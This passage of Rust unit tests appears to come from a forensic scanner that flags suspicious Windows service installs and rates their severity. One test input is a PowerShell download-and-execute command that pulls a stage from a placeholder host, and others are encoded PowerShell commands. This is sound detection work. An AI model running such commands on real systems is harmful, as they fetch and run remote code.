            command_key(&ctx, r"C:\Windows\svc.exe -enc AbCd")
        );
        event["System"]["Computer"] = "different-host.invalid".into();
        assert!(install_key(&ctx, &event).is_none());
        event["System"]["Computer"] = computer.into();
        event["System"]["Provider"]["#attributes"]["Name"] = "Unrelated Provider".into();
        assert!(install_key(&ctx, &event).is_none());
        event["System"]["Provider"]["#attributes"]["Name"] = "Service Control Manager".into();
        event["EventData"]["ImagePath"] = serde_json::json!([r"C:\a.exe", r"C:\b.exe"]);
        assert!(install_key(&ctx, &event).is_none());
    }
    #[test]
    fn an_ordinary_allocated_service_is_not_reported_as_deleted_history() {
        let dir = tempfile::tempdir().unwrap();
        assert!(
            scan_native(dir.path(), r"C:\Corp\agent.exe", false)
                .findings
                .is_empty()
        );
    }
    #[test]
    fn suspicious_historical_shell_command_is_medium_not_a_claim_of_active_persistence() {
        let dir = tempfile::tempdir().unwrap();
        let scan = scan_native(
            dir.path(),
            "powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/stage')",
            true,
        );
        assert_eq!(scan.findings.len(), 1);
        assert_eq!(scan.findings[0].severity, "MEDIUM");
        assert!(scan.findings[0].description.contains("not proof"));
    }
    #[test]
    fn install_command_matching_keeps_arguments_case_sensitive() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = Context::open(dir.path(), true).unwrap();
        assert_ne!(
            command_key(&ctx, "powershell.exe -enc AbCd"),
            command_key(&ctx, "PowerShell.exe -enc aBCd")
        );
        assert_eq!(
            command_key(&ctx, r"C:\Windows\service.exe /run"),
            command_key(&ctx, r"c:\windows\SERVICE.EXE /run")
        );
    }
}
